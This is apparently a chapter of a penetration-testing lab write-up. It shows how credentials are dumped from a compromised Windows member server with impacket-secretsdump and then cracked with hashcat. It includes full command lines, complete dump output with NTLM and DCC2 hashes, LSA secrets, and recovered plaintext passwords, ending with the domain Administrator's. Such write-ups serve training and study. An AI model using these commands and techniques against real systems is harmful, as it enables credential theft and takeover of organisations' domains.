# 09 — Credentials: SAM, DCC2, and the domain Administrator

`eric.wallows` is an administrator on MS01 now, so the registry is readable over the network.
What comes back is the material that decides the rest of the set: local hashes, two cached domain
logons, and an unattended-install password.

---

## 9.1 The dump

Run from Kali, against MS01's Kali-facing address:

```bash
impacket-secretsdump 'Eric.Wallows':'EricLikesRunning800'@192.168.131.147
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
cloudbase-init:1004:aad3b435b51404eeaad3b435b51404ee:7196a80d9edcc5dc984f6fc9190383f8:::
Admin:1005:aad3b435b51404eeaad3b435b51404ee:4ca9a2dd36a93bc913bad3487f1ed865:::
[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-10 10:06:42+00:00)
OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2022-12-01 11:08:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
OSCP\MS01$:aes256-cts-hmac-sha1-96:dbbbb9735f9000c2fd7ac0b56541e47bb673f64f87786199ec278d48a2c68d0e
OSCP\MS01$:aes128-cts-hmac-sha1-96:fa7a037d0987c7af07ac50f5a8948101
OSCP\MS01$:des-cbc-md5:0becb0bf1c261af2
OSCP\MS01$:plain_password_hex:<machine password hex omitted>
OSCP\MS01$:aad3b435b51404eeaad3b435b51404ee:102277329cc27c152b4d00358114673b:::
[*] DefaultPassword
oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
[*] DPAPI_SYSTEM
dpapi_machinekey:0x14cc9accbb06d4af8f07295749933b06cf0d6dfd
dpapi_userkey:0x4c31eb802e3529d34f198a0473a6745cf5948527
[*] NL$KM
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] _SC_cloudbase-init
cloudbase-init:xHkv0GSLJ45ShO6ETjQm
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

The machine-password hex is the one line omitted: it is a long blob and adds nothing the AES keys
and NTLM value above do not already carry.

Re-running the same dump as `Administrator:December31` later in the session returned the same
values — which is the check that the cracked local password, not just the group membership, is
real.

---

## 9.2 Reading the dump

There are three different stores in that output, and they are worth keeping apart:

| Store | Entry | What it is |
|---|---|---|
| `SAM` | `Administrator` | local account on MS01 — hash `3c4495bb…` |
| `SAM` | `support`, `Admin`, `Mary.Williams`, `cloudbase-init` | other local accounts, image passwords |
| `SECURITY` (DCC2) | `OSCP.EXAM/Administrator` | a **cached domain logon** from 2022-11-10 |
| `SECURITY` (DCC2) | `OSCP.EXAM/web_svc` | cached domain logon from 2022-12-01 |
| LSA secret | `DefaultPassword` | unattended-install password for `oscp.exam\celia.almeda` |
| LSA secret | `_SC_cloudbase-init` | password for the `cloudbase-init` service account |
| LSA secret | `$MACHINE.ACC` | MS01's machine account keys |

Two entries matter:

**The `SAM` `Administrator` hash** is a local credential. Cracked, it gives administrative access
to MS01 — useful, but MS01 is already owned.

**The DCC2 entry for `OSCP.EXAM/Administrator`** is domain-tier. It is the cached verifier for
the *domain* Administrator's interactive logon on this member server, left behind when an
administrator logged on in 2022. It survives reboots, and it is not in LSASS — which is why the
earlier LSASS triage on this set found nothing domain-tier.

`DefaultPassword` is the same value pass 2 used for `celia.almeda`. Same image, same account; on
this host, MS01's LSA secrets are one place that credential leaks from.

---

## 9.3 Cracking the local hashes

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

```
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Recovered........: 3/9 (33.33%) Digests (total), 0/9 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
```

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
```

```
3c4495bbd678fac8c9d218be4f2bbc7b:December31
31d6cfe0d16ae931b73c59d7e0c089c0:
d9358122015c5b159574a88b3c0d2071:Freedom1
```

Three recovered: `Administrator:December31`, `support:Freedom1`, and the empty-password NT hash
shared by the disabled/default accounts (the blank after the colon is the empty password, not a
result).

`rockyou` exhausted the rest — `Mary.Williams`, `Admin` and `cloudbase-init` did not fall to a
plain dictionary.

---

## 9.4 Cracking the cache

DCC2 is PBKDF2-HMAC-SHA1 with 10,240 iterations and the username as salt, so `-m 2100` is much
slower per candidate than raw NTLM. The captured scrollback does not include the `-m 2100`
invocation; the mappings below were re-checked against the captured hashes:

```
$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a:7Tg9M9MZbzAokR9
$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3:Diamond1
```

The second is a password already known from the earlier pages — `web_svc:Diamond1` — and it
confirms the cache is genuine: the same account, the same secret, recovered independently.

The first is the domain Administrator's password, and it is the credential that opens DC01 in
chapter 12.

That is the whole chain in one line:

```
SYSTEM on MS01  →  secretsdump  →  DCC2 cache  →  domain Administrator password
```

No kerberoast, no MSSQL, no BloodHound edge. The directory was not attacked at all; a member
server's cache was.

---

## 9.5 Position after this chapter

| Item | State |
|---|---|
| MS01 local admin | `Administrator:December31` (cracked) |
| Domain Administrator | **password recovered** from the DCC2 cache |
| `web_svc` | confirmed again (`Diamond1`) |
| `celia.almeda` | password leaked in `DefaultPassword` |
| DC01 | not touched — but the credential for it is in hand |

The remaining problem is transport: DC01 is on `10.10.131.0/24`, and Kali cannot route there yet.
